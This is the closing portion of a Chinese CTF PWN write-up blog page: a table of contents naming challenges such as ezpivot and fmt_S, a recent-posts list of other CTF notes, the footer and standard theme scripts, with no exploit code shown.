class="toc-text">ezpivot</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-14"><span class="toc-number">1.15.1.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-14"><span class="toc-number">1.15.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xdulaker"><span class="toc-number">1.16.</span> <span class="toc-text">xdulaker</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-15"><span class="toc-number">1.16.1.</span> <span class="toc-text">解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%B8%AD"><span class="toc-number">1.16.1.0.1.</span> <span class="toc-text">题目中</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-15"><span class="toc-number">1.16.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezprotection"><span class="toc-number">1.17.</span> <span class="toc-text">ezprotection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-16"><span class="toc-number">1.17.1.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-16"><span class="toc-number">1.17.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hardpivot"><span class="toc-number">1.18.</span> <span class="toc-text">hardpivot</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-17"><span class="toc-number">1.18.1.</span> <span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-17"><span class="toc-number">1.18.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fmt-S"><span class="toc-number">1.19.</span> <span class="toc-text">fmt_S</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-18"><span class="toc-number">1.19.1.</span> <span class="toc-text">解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%86%E6%98%AF%E8%BF%99%E6%A0%B7%E7%9A%84%E8%AF%9D%EF%BC%8C%E8%A6%81%E5%86%99%E5%85%A5%E2%80%9D-sh%E2%80%9D%EF%BC%88%E4%B8%A4%E4%B8%AA%E7%A9%BA%E6%A0%BC-%E2%80%9Cs%E2%80%9D-%E2%80%9Ch%E2%80%9D%EF%BC%89%E9%9C%80%E8%A6%81%E5%9B%9B%E6%AC%A1%E5%86%99%E5%85%A5%EF%BC%8C%E7%AF%A1%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E5%8F%88%E9%9C%80%E8%A6%81%E4%B8%A4%E6%AC%A1%E5%86%99%E5%85%A5%EF%BC%8C%E8%80%8C%E6%88%91%E4%BB%AC%E5%9C%A8%E5%8F%AA%E7%A1%AE%E4%BF%9Dflag-0%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E4%B9%9F%E5%8F%AA%E8%83%BD%E6%9C%89%E4%B8%89%E6%AC%A1%E5%86%99%E5%85%A5%E7%9A%84%E6%9C%BA%E4%BC%9A%EF%BC%8C%E8%BF%99%E8%BF%9C%E8%BF%9C%E4%B8%8D%E5%A4%9F%EF%BC%9F%EF%BC%9F%EF%BC%9F%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E6%9B%B4%E5%A4%9A%E7%9A%84%E5%86%99%E5%85%A5%E6%AC%A1%E6%95%B0%EF%BC%81%EF%BC%81%EF%BC%81"><span class="toc-number">1.19.1.0.0.1.</span> <span class="toc-text">但是这样的话，要写入”  sh”（两个空格 + “s” + “h”）需要四次写入，篡改返回地址又需要两次写入，而我们在只确保flag &#x3D;&#x3D; 0的情况下也只能有三次写入的机会，这远远不够？？？我们需要更多的写入次数！！！</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E6%93%8D%E4%BD%9C"><span class="toc-number">1.19.2.</span> <span class="toc-text">具体操作</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/10/13/MoeCTF2025-PWN%E6%96%B9%E5%90%91%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" title="MoeCTF2025-PWN方向做题笔记"><img src="/img/OIO.jpg" onerror="this.onerror=null;this.src='/img/loading.jpg'" alt="MoeCTF2025-PWN方向做题笔记"/></a><div class="content"><a class="title" href="/2025/10/13/MoeCTF2025-PWN%E6%96%B9%E5%90%91%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" title="MoeCTF2025-PWN方向做题笔记">MoeCTF2025-PWN方向做题笔记</a><time datetime="2025-10-12T16:00:00.000Z" title="发表于 2025-10-13 00:00:00">2025-10-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/30/202576-LitCTF(2023%20-%202025)-PWN%E6%96%B9%E5%90%91%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" title="LitCTF-PWN方向做题笔记"><img src="/img/OIO.jpg" onerror="this.onerror=null;this.src='/img/loading.jpg'" alt="LitCTF-PWN方向做题笔记"/></a><div class="content"><a class="title" href="/2025/09/30/202576-LitCTF(2023%20-%202025)-PWN%E6%96%B9%E5%90%91%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" title="LitCTF-PWN方向做题笔记">LitCTF-PWN方向做题笔记</a><time datetime="2025-09-29T16:00:00.000Z" title="发表于 2025-09-30 00:00:00">2025-09-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/06/NepCTF2025-PWN%E6%96%B9%E5%90%91%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" title="NepCTF2025-PWN方向做题笔记"><img src="/img/OIO.jpg" onerror="this.onerror=null;this.src='/img/loading.jpg'" alt="NepCTF2025-PWN方向做题笔记"/></a><div class="content"><a class="title" href="/2025/09/06/NepCTF2025-PWN%E6%96%B9%E5%90%91%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" title="NepCTF2025-PWN方向做题笔记">NepCTF2025-PWN方向做题笔记</a><time datetime="2025-09-05T16:00:00.000Z" title="发表于 2025-09-06 00:00:00">2025-09-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/29/Ubuntu22.04%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%EF%BC%88CTF-PWN%EF%BC%89/" title="Ubuntu22.04的环境配置（CTF-PWN）"><img src="/img/OIO.jpg" onerror="this.onerror=null;this.src='/img/loading.jpg'" alt="Ubuntu22.04的环境配置（CTF-PWN）"/></a><div class="content"><a class="title" href="/2025/07/29/Ubuntu22.04%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%EF%BC%88CTF-PWN%EF%BC%89/" title="Ubuntu22.04的环境配置（CTF-PWN）">Ubuntu22.04的环境配置（CTF-PWN）</a><time datetime="2025-07-28T16:00:00.000Z" title="发表于 2025-07-29 00:00:00">2025-07-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/06/BaseCTF2024%E6%96%B0%E7%94%9F%E8%B5%9B-PWN%E6%96%B9%E5%90%91%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" title="BaseCTF2024新生赛-PWN方向做题笔记"><img src="/img/OIO.jpg" onerror="this.onerror=null;this.src='/img/loading.jpg'" alt="BaseCTF2024新生赛-PWN方向做题笔记"/></a><div class="content"><a class="title" href="/2025/07/06/BaseCTF2024%E6%96%B0%E7%94%9F%E8%B5%9B-PWN%E6%96%B9%E5%90%91%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" title="BaseCTF2024新生赛-PWN方向做题笔记">BaseCTF2024新生赛-PWN方向做题笔记</a><time datetime="2025-07-05T16:00:00.000Z" title="发表于 2025-07-06 00:00:00">2025-07-06</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2025/4/19 - 2025 By Icyice</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="100" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>